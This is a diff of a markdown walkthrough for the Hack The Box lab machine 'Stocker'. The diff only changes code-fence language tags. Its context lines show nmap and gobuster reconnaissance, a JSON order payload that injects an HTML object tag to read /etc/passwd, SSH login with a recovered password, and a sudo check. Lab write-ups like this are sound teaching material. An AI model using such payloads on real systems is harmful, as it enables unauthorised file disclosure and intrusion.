@@ -2,7 +2,7 @@
 
 
 we atart with nmap scan:
-```Shell
+```shell
 ┌──(Jack㉿Sparrow)-[~/Downloads/htb/stocker]
 └─$ sudo nmap -sS -sC -T5 10.10.11.196 -oN nmap.txt
 [sudo] password for Jack: 
@@ -29,7 +29,7 @@ add `stocker.htb` to `/etc/hosts` file
 visiting this page we see one comment from `Angoose Garden, Head of IT at Stockers Ltd.`
 
 next we try to bruteforce subdomains:
-```Shell
+```shell
 ┌──(Jack㉿Sparrow)-[~]
 └─$ gobuster vhost -u stocker.htb -w /usr/share/wordlists/dirb/common.txt  --append-domain  -t 100
 ===============================================================
@@ -71,7 +71,7 @@ Payload:
 {"basket":[{"_id":"638f116eeb060210cbd83a8d","title":"<object data='file:///etc/passwd'>","description":"It's a red cup.","image":"/etc/passwd","price":32,"currentStock":4,"__v":0,"amount":1}]}
 ```
 response:
-```Json
+```json
 {"success":true,"orderId":"642550c92e188ca84f0a3f46"}
 ```
 
@@ -98,7 +98,7 @@ we can try this username:`Angoose` and password on ssh.
 
 chech root Permission using `sudo -l`
 
-```Shell
+```shell
 angoose@stocker:~$ sudo -l
 [sudo] password for angoose: 
 Sorry, try again.
